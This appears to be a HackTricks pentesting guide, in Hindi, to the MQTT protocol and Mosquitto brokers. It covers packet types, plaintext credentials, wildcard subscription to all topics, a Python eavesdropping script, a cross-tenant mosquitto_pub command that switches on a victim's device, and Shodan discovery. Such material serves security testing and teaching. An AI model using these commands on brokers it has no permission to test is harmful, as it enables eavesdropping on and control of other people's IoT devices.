# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी

**MQ Telemetry Transport (MQTT)** को एक ऐसे **publish/subscribe messaging protocol** के रूप में जाना जाता है जो अपनी अत्यधिक सादगी और हल्केपन के लिए विशेष रूप से प्रसिद्ध है। यह प्रोटोकॉल विशेष रूप से उन वातावरणों के लिए बनाया गया है जहाँ डिवाइसों की क्षमता सीमित होती है और जो कम बैंडविड्थ, उच्च लेटेंसी या अविश्वसनीय कनेक्शनों वाले नेटवर्क पर काम करते हैं। MQTT के मुख्य उद्देश्य नेटवर्क बैंडविड्थ के उपयोग को न्यूनतम करना और डिवाइस संसाधनों पर मांग को कम करना हैं। इसके अतिरिक्त, इसका लक्ष्य विश्वसनीय संचार बनाए रखना और एक निश्चित स्तर की डिलीवरी आश्वासन प्रदान करना भी है। ये लक्ष्य MQTT को machine-to-machine (M2M) communication और Internet of Things (IoT) के तेजी से बढ़ते क्षेत्र के लिए अत्यंत उपयुक्त बनाते हैं, जहाँ बड़ी संख्या में डिवाइसों को कुशलतापूर्वक जोड़ना आवश्यक होता है। इसके अलावा, MQTT मोबाइल एप्लिकेशन्स के लिए भी बेहद फायदेमंद है, जहाँ बैंडविड्थ और बैटरी जीवन की बचत महत्वपूर्ण होती है।

**डिफ़ॉल्ट पोर्ट:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## ट्रैफिक का निरीक्षण

जब MQTT brokers द्वारा **CONNECT** packet प्राप्त होता है, तो एक **CONNACK** packet वापस भेजा जाता है। इस packet में एक return code होता है जो connection status को समझने के लिए महत्वपूर्ण है। return code **0x00** का मतलब है कि credentials स्वीकार कर दिए गए हैं, जो सफल connection को दर्शाता है। दूसरी ओर, return code **0x05** इंगित करता है कि credentials invalid हैं, इसलिए connection रोका जाता है।

उदाहरण के लिए, यदि broker invalid credentials के कारण connection को reject कर देता है, तो परिस्थिति कुछ इस तरह दिखेगी:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional** और यहाँ तक कि अगर authentication किया जा रहा हो, तो **encryption is not used by default** (credentials are sent in clear text). MITM attacks अभी भी किए जा सकते हैं ताकि passwords चोरी किए जा सकें।

MQTT service से कनेक्ट करने के लिए आप उपयोग कर सकते हैं: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) और सभी topics को subscribe करने के लिए:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
आप यह भी उपयोग कर सकते हैं [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

आप यह भी उपयोग कर सकते हैं:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
या आप **यह कोड चला कर authentication के बिना किसी MQTT सेवा से कनेक्ट करने, हर topic को subscribe करने और उन्हें सुनने की कोशिश कर सकते हैं**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### प्रकाशन/सदस्यता (Publish/Subscribe) पैटर्न <a href="#b667" id="b667"></a>

Publish/Subscribe मॉडल में निम्न शामिल हैं:

- **Publisher**: ब्रोकरेर में एक (या कई) टॉपिक(स) पर संदेश प्रकाशित करता है।
- **Subscriber**: ब्रोकरेर में एक (या कई) टॉपिक(स) की सदस्यता लेता है और Publisher द्वारा भेजे गए सभी संदेश प्राप्त करता है।
- **Broker**: publishers से subscribers तक सभी संदेश रूट करता है।
- **Topic**: एक या अधिक स्तरों से बना होता है जिन्हें फॉरवर्ड स्लैश द्वारा अलग किया जाता है (उदा., /smartshouse/livingroom/temperature)।

### पैकेट प्रारूप <a href="#f15a" id="f15a"></a>

प्रत्येक MQTT पैकेट में एक fixed header होता है (Figure 02).Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): क्लाइंट द्वारा सर्वर से कनेक्शन अनुरोध करने के लिए आरंभ किया जाता है।
- CONNACK (2): सफल कनेक्शन के लिए सर्वर की स्वीकृति।
- PUBLISH (3): क्लाइंट से सर्वर या सर्वर से क्लाइंट को संदेश भेजने के लिए उपयोग किया जाता है।
- PUBACK (4): PUBLISH पैकेट की पुष्टि।
- PUBREC (5): संदेश प्राप्त होने की पुष्टि सुनिश्चित करने वाली डिलिवरी प्रोटोकॉल का हिस्सा।
- PUBREL (6): संदेश डिलिवरी में आगे की गारंटी, संदेश रिलीज़ का संकेत देता है।
- PUBCOMP (7): संदेश डिलिवरी प्रोटोकॉल का अंतिम भाग, पूरा होने का संकेत देता है।
- SUBSCRIBE (8): किसी टॉपिक से संदेश सुनने के लिए क्लाइंट का अनुरोध।
- SUBACK (9): SUBSCRIBE अनुरोध के लिए सर्वर की स्वीकृति।
- UNSUBSCRIBE (10): किसी टॉपिक से संदेश प्राप्त करना बंद करने के लिए क्लाइंट का अनुरोध।
- UNSUBACK (11): UNSUBSCRIBE अनुरोध के लिए सर्वर का उत्तर।
- PINGREQ (12): क्लाइंट द्वारा भेजा गया heartbeat संदेश।
- PINGRESP (13): heartbeat संदेश के लिए सर्वर का उत्तर।
- DISCONNECT (14): कनेक्शन समाप्त करने के लिए क्लाइंट द्वारा आरंभ किया गया।
- दो मान, 0 और 15, आरक्षित के रूप में चिन्हित हैं और उनकी उपयोगिता निषिद्ध है।

## IoT MQTT ecosystem attacks: plaintext brokers and topic ACL bypass

कई consumer IoT प्लेटफ़ॉर्म MQTT brokers का प्रदर्शन करते हैं जिन्हें दो अलग-अलग भूमिकाएँ उपयोग करती हैं:
- Gateway/hub devices जो radio protocols (उदा., BLE/LoRa/Zigbee) को cloud से bridge करते हैं।
- Mobile apps या web backends जो “app” टॉपिक्स के माध्यम से डिवाइसों को नियंत्रित करते हैं।

Pentest के दौरान आप जिन सामान्य कमजोरियों का दुरुपयोग कर सकते हैं:

- Plaintext MQTT गैर-मानक पोर्ट्स (उदा., TCP/8001) पर MQTTS की बजाय। किसी भी on-path observer को credentials और control frames पढ़ने का मौका मिल सकता है। असामान्य पोर्ट्स पर cleartext CONNECT/CONNACK और SUBSCRIBE/PUBLISH ट्रैफ़िक पहचानने के लिए Wireshark का उपयोग करें।
- कमजोर या गायब per-tenant topic ACLs। अगर topics केवल deviceId के द्वारा नेमस्पेस किए गए हों (उदा., "/tenantless/<deviceId>/tx"), तो कोई भी authenticated user अन्य tenants के devices पर PUBLISH कर सकता है।
- मेंटेनेंस/एडमिन टॉपिक्स के माध्यम से Sensitive data leakage (उदा., config बदलने के बाद Wi‑Fi credentials का cleartext में ब्रॉडकास्ट)।

Examples (replace placeholders with real values):

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
ACLs कमजोर होने पर क्रॉस-टेनेंट नियंत्रण (दूसरे tenant के device topic पर publish):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- IoT में, non-standard ports पर MQTT plaintext सामान्य है। alternative ports पर brokers की तलाश करें और protocol detection से पुष्टि करें।

## संदर्भ

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
